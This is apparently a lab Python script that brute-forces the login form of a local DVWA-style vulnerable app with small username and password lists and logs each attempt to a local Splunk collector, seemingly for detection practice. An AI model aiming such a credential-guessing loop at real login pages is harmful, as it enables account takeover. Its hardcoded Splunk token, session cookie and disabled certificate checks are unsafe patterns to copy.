import requests
import json
from datetime import datetime

# --- Splunk HEC config ---
SPLUNK_URL = "https://localhost:8088/services/collector/event"
SPLUNK_TOKEN = "06558f03-251e-43ed-b7b4-44699e9e10fb"

def send_to_splunk(username, password, status, http_code):
    event = {
        "event": {
            "tool": "brute_force",
            "username": username,
            "password": password,
            "status": status,
            "http_code": http_code,
            "timestamp": datetime.utcnow().isoformat()
        },
        "sourcetype": "appsec_brute_force",
        "index": "main"
    }
    try:
        requests.post(
            SPLUNK_URL,
            headers={"Authorization": f"Splunk {SPLUNK_TOKEN}"},
            json=event,
            verify=False  # self-signed cert in local Splunk
        )
    except Exception as e:
        print(f"[SPLUNK ERROR] {e}")

# --- Brute force logic ---
target = "http://localhost/vulnerabilities/brute/"
usernames = ["admin", "user", "test", "guest"]
passwords = ["password", "123456", "admin", "letmein", "test"]

for username in usernames:
    for password in passwords:
        response = requests.get(target, params={
            "username": username,
            "password": password,
            "Login": "Login"
        }, cookies={"PHPSESSID": "52fbhog4cqutf5154ktn41jcv4", "security": "low"})

        if "Welcome" in response.text:
            status = "FOUND"
            print(f"[FOUND] Username: {username} Password: {password}")
        else:
            status = "MISS"
            print(f"[MISS]  Username: {username} Password: {password}")

        send_to_splunk(username, password, status, response.status_code)